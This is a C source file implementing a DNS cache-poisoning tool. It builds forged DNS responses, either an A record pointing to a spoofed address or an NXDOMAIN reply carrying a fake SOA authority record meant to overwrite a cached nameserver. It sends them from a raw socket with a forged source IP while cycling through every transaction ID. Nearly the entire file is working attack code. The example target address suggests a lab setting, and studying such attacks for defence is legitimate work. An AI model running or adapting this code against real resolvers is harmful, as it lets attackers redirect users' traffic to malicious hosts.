#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <stdbool.h>

#define PACKET_LENGTH 8192

// Debug function
void wireshark_hexdump(const unsigned char *data, size_t size, int offset) {
    for (size_t i = 0; i < offset; i++) {
        printf("   ");
    }
    if (offset >= 8) {
        printf(" ");
    }
    for (size_t i = 0; i < size; i++) {
        printf("%02X ", data[i]);
        if ((i+offset) % 8 == 7) {
            printf(" ");
        }
        if ((i+offset) % 16 == 15) {
            printf("\n");
        }
    }
    printf("\n");
}

// https://datatracker.ietf.org/doc/html/rfc1035#section-4.1.1
struct DNSHeader {
    uint16_t id;
    uint16_t flags;
    uint16_t qdcount;
    uint16_t ancount;
    uint16_t nscount;
    uint16_t arcount;
} __attribute__((packed));

struct DNSQuestion {
    // qname not fixed size
    uint16_t qtype;
    uint16_t qclass;
} __attribute__((packed));

struct DNSAnswerA {
    uint16_t name;   // pointer to the name in question section
    uint16_t type;
    uint16_t class;
    uint32_t ttl;
    uint16_t rdlength;
    uint32_t rdata; // specifically 32-bit for A record, see https://datatracker.ietf.org/doc/html/rfc1035#section-3.4.1
} __attribute__((packed));

struct DNSAnswer {
    uint16_t name;   // pointer to the name in question section
    uint16_t type;
    uint16_t class;
    uint32_t ttl;
    uint16_t rdlength;
    // rdata
} __attribute__((packed));

// SOA https://datatracker.ietf.org/doc/html/rfc1035#section-3.3.13
// MNAME
// RNAME
// SERIAL 32bit
// REFRESH 32bit
// RETRY 32bit
// EXPIRE 32bit
// MINIMUM 32bit

void encode_domain_name(const char *domain, unsigned char *buffer) {
    const char *pos = domain;
    unsigned char *len_ptr = buffer; // pointer to length byte
    unsigned char length = 0;

    while (*pos) {
        if (*pos == '.') {
            *len_ptr = length;  // set length of this label
            len_ptr = buffer + (pos - domain) + 1; // move to next length byte
            length = 0;
        } else {
            buffer[1 + (pos - domain)] = *pos; // store character
            length++;
        }
        pos++;
    }
    *len_ptr = length; // set length of last label
    buffer[pos - domain + 1] = 0; // terminate with 0
}

void generate_packet(unsigned char *packet, int packet_max_size, int *packet_size, const char *fidget_domain, int main_domain_offset, bool nxdomain) {
    memset(packet, 0, packet_max_size);

    // DNS header
    struct DNSHeader *dns = (struct DNSHeader *)packet;
    // See https://datatracker.ietf.org/doc/html/rfc1035#section-4.1.1
    dns->id = htons(0x1234);           // transaction ID
    // Flags: 
    // +--+-----------+--+--+--+--+--------+-----------+
    // |15|         11|10| 9| 8| 7|       4|          0| 
    // |QR|   Opcode  |AA|TC|RD|RA|   Z    |   RCODE   |
    // +--+-----------+--+--+--+--+--------+-----------+
    int flags = 
        1 << 15 | // QR = 1 (response)
        0 << 11 | // Opcode = 0 (standard query)
        0 << 10 | // AA = 0 (not authoritative answer)
        0 << 9 |  // TC = 0 (no truncation)
        1 << 8 |  // RD = 1 (recursion desired)
        1 << 7 |  // RA = 1 (recursion available)
        0 << 6 |  // Z = 0 (reserved)
        0 << 5 |  // Answer authenticated = 0 (from Wireshark, not RCF1035, probably later addition)
        1 << 4 |  // Non-authenticated data: Acceptable (also from Wireshark)
        (nxdomain ? 3 : 0) << 0;   // Rcode = 0 (no error) or 3 (NXDOMAIN)
    dns->flags = htons(flags);        // standard query response, no error
    dns->qdcount = htons(1);           // 1 question
    dns->ancount = htons((nxdomain ? 0 : 1));           // 1 answer
    dns->nscount = htons((nxdomain ? 1 : 0));           // 1 authority records (nameserver count) (to overwrite the cached nameserver)
    dns->arcount = htons(0);           // 0 additional records

    // Question section
    unsigned char *fidget_qname = packet + sizeof(struct DNSHeader);
    encode_domain_name(fidget_domain, fidget_qname);

    struct DNSQuestion *question = (struct DNSQuestion *)(fidget_qname + strlen((char *)fidget_qname) + 1); // +1 for null byte
    question->qtype = htons(1);    // A record
    question->qclass = htons(1);   // IN

    struct DNSAnswerA *answer = (struct DNSAnswerA *)((unsigned char *)question + sizeof(struct DNSQuestion));
    struct DNSAnswer *soa = (struct DNSAnswer *)((nxdomain ? (unsigned char *)question + sizeof(struct DNSQuestion) : (unsigned char *)(answer) + sizeof(struct DNSAnswerA)));
    if (!nxdomain) {
        // Answer section
        // See https://datatracker.ietf.org/doc/html/rfc1035#section-4.1.3
        answer->name = htons(0xC00C);  // Pointer to offset 12 bytes (start of qname in dns query). See https://datatracker.ietf.org/doc/html/rfc1035#section-4.1.4
        answer->type = htons(1);       // A record
        answer->class = htons(1);      // IN
        answer->ttl = htonl(3600);     // TTL 1 hour
        answer->rdlength = htons(4);   // IPv4 address length
        answer->rdata = inet_addr("192.168.128.128"); // Spoofed IP adderss
    } else {
        soa->name = htons(0xC00C + main_domain_offset); // Pointer to offset 12 + offset (ie 14 for X.eliaslundell.se e.g.)
        soa->type = htons(6);       // SOA record
        soa->class = htons(1);      // IN
        soa->ttl = htonl(3600);     // TTL 1 hour

        void* soa_rdata = (void*)soa + sizeof(struct DNSAnswer);
        void* soa_rdata_start = soa_rdata;
        const char *ns_domain = "ns.test.com";
        encode_domain_name(ns_domain, (unsigned char*)soa_rdata);
        soa_rdata += strlen((char*)soa_rdata) + 1;

        const char* mname_domain = "dns.test.com";
        encode_domain_name(mname_domain, (unsigned char*)soa_rdata);
        soa_rdata += strlen((char*)soa_rdata) + 1;

        *(uint32_t*)(soa_rdata)      = htonl(2386141192); // Serial
        *(uint32_t*)(soa_rdata + 4)  = htonl(10000); // Refresh
        *(uint32_t*)(soa_rdata + 8)  = htonl(2400); // Retry
        *(uint32_t*)(soa_rdata + 12) = htonl(604800); // Expire
        *(uint32_t*)(soa_rdata + 16) = htonl(1800); // Minimum
                                                    
        soa->rdlength = htons(soa_rdata + 20 - soa_rdata_start);   // SOA record length
    }

    *packet_size = sizeof(struct DNSHeader) + (strlen((char *)fidget_qname) + 1) +
                   sizeof(struct DNSQuestion) + (nxdomain ? 0 : sizeof(struct DNSAnswerA)) + 
                   (nxdomain ? sizeof(struct DNSAnswer) + ntohs(soa->rdlength) : 0);
}

void change_transaction_id(unsigned char *packet, uint16_t new_id) {
    struct DNSHeader *dns = (struct DNSHeader *)packet;
    dns->id = htons(new_id);
}

// From https://gist.github.com/leonid-ed/909a883c114eb58ed49f
unsigned short csum(unsigned short *buf, int nwords)
{
    unsigned long sum;
    for (sum = 0; nwords > 0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

int flood(int argc, char *argv[]) {
    printf("IMPORTANT: This will flood with UDP pcakets and therefore perform a DOS attack. Use with caution and follow all rules and laws when using!\n");
    if (argc != 8) {
        printf("Usage: %s <spoofed_ip> <spoofed_port> <dns_server_ip> <dns_server_request_post> <fidget_domain> <main_domain_offset> <nxdomain>\n", argv[0]);
        printf("Example: %s 1.1.1.1 53 172.18.0.2 33333 XX.eliaslundell.se 3 1\n", argv[0]);
        return 1;
    }

    u_int32_t src_addr = inet_addr(argv[1]);
    u_int16_t src_port = atoi(argv[2]);
    u_int32_t dst_addr = inet_addr(argv[3]);
    u_int16_t dst_port = atoi(argv[4]);

    int main_domain_offset = atoi(argv[6]);
    bool nxdomain = atoi(argv[7]);

    unsigned char packet[512];
    int packet_size;

    generate_packet(packet, 512, &packet_size, argv[5], main_domain_offset, nxdomain);

    printf("DNS response packet generated (%d bytes):\n", packet_size);
    wireshark_hexdump(packet, packet_size, 10);

    // Setup UDP socket addr struct
    int sd;
    char buffer[PACKET_LENGTH];
    struct iphdr *ip = (struct iphdr *)buffer;
    struct udphdr *udp = (struct udphdr *)(buffer + sizeof(struct iphdr));
    char *data = buffer + sizeof(struct iphdr) + sizeof(struct udphdr);

    struct sockaddr_in sin;
    int one = 1;
    const int *val = &one;

    memset(buffer, 0, PACKET_LENGTH);
    memcpy(data, packet, packet_size);

    // create a raw socket with UDP protocol
    sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sd < 0)
    {
        perror("socket() error");
        exit(2);
    }
    printf("OK: raw socket created.\n");

    // inform the kernel we provide the IP header
    if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
    {
        perror("setsockopt() error");
        exit(2);
    }
    printf("OK: IP_HDRINCL set.\n");

    sin.sin_family = AF_INET;
    sin.sin_port = htons(dst_port);
    sin.sin_addr.s_addr = dst_addr;

    // fabricate the IP header
    ip->ihl = 5;
    ip->version = 4;
    ip->tos = 0;
    ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + packet_size);
    ip->id = htons(54321);
    ip->ttl = 64;
    ip->protocol = IPPROTO_UDP;
    ip->saddr = src_addr;
    ip->daddr = dst_addr;

    // fabricate the UDP header
    udp->source = htons(src_port);
    udp->dest = htons(dst_port);
    udp->len = htons(sizeof(struct udphdr) + packet_size);
    udp->check = 0; // optional, kernel may ignore it

    uint16_t transaction_id = 0;
    while (transaction_id < 65535) {
        transaction_id++;
        change_transaction_id(data, transaction_id);
        ip->check = csum((unsigned short *)buffer, sizeof(struct iphdr) / 2);

        if (sendto(sd, buffer, sizeof(struct iphdr) + sizeof(struct udphdr) + packet_size, 0,
                   (struct sockaddr *)&sin, sizeof(sin)) < 0)
        {
            perror("sendto()");
            exit(3);
        }
    }

    printf("Flooded with 65535 DNS packets.\n");

    close(sd);
    return 0;
}

int main(int argc, char *argv[]) {
    return flood(argc, argv);
}

